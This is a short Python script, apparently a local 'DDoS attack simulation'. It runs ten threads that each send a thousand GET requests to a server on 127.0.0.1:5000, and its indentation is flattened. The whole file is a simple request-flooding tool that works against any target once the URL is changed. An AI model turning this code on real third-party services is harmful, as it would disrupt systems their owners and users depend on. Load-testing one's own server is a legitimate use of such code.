import threading
import requests
# Define the target URL
target_url = "http://127.0.0.1:5000/"
# Define the number of threads (concurrent requests)
num_threads = 10
# Define the number of requests per thread
num_requests_per_thread = 1000
# Define a function for each thread to execute
def attack():
for _ in range(num_requests_per_thread):
try:
# Send an HTTP GET request to the target URL
response = requests.get(target_url)
# Print the status code (optional)
print(response.status_code)
except requests.RequestException as e:
# Handle any exceptions that may occur
print(f"Error: {e}")
# Create and start multiple threads to simulate a DDoS attack
threads = []
for _ in range(num_threads):
thread = threading.Thread(target=attack)
thread.start()
threads.append(thread)
# Wait for all threads to complete
for thread in threads:
thread.join()
print("DDoS attack simulation completed.")